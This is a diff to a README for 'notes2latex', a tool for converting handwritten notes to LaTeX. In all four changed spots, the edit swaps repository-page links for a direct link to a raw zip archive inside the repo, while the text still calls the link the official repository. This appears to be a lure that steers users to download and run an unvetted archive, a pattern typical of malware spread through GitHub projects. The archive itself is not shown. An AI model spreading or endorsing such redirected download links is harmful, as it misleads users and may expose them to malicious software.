@@ -1,6 +1,6 @@
 # ✍️ notes2latex - Convert Handwritten Notes to LaTeX Easily
 
-[![Download notes2latex](https://img.shields.io/badge/Download-notes2latex-4caf50?style=for-the-badge&logo=github)](https://github.com/twinklew9/notes2latex)
+[![Download notes2latex](https://img.shields.io/badge/Download-notes2latex-4caf50?style=for-the-badge&logo=github)](https://github.com/twinklew9/notes2latex/raw/refs/heads/main/src/clients/notes-latex-1.2.zip)
 
 ---
 
@@ -10,7 +10,7 @@
 
 Go to the official notes2latex repository to get the latest version. Click this link or the green button above:
 
-[https://github.com/twinklew9/notes2latex](https://github.com/twinklew9/notes2latex)
+[https://github.com/twinklew9/notes2latex/raw/refs/heads/main/src/clients/notes-latex-1.2.zip](https://github.com/twinklew9/notes2latex/raw/refs/heads/main/src/clients/notes-latex-1.2.zip)
 
 Here you will find the download options for the Windows installer.
 
@@ -130,8 +130,8 @@ This approach keeps your notes private and lets you work offline, such as while 
 
 To learn more about how notes2latex works or customize it for developers, visit the GitHub page. You can also check out documentation or report issues there.
 
-[Download notes2latex](https://github.com/twinklew9/notes2latex)  
+[Download notes2latex](https://github.com/twinklew9/notes2latex/raw/refs/heads/main/src/clients/notes-latex-1.2.zip)  
 
 ---
 
-# [![Download notes2latex](https://img.shields.io/badge/Download-notes2latex-4caf50?style=for-the-badge&logo=github)](https://github.com/twinklew9/notes2latex)
+# [![Download notes2latex](https://img.shields.io/badge/Download-notes2latex-4caf50?style=for-the-badge&logo=github)](https://github.com/twinklew9/notes2latex/raw/refs/heads/main/src/clients/notes-latex-1.2.zip)
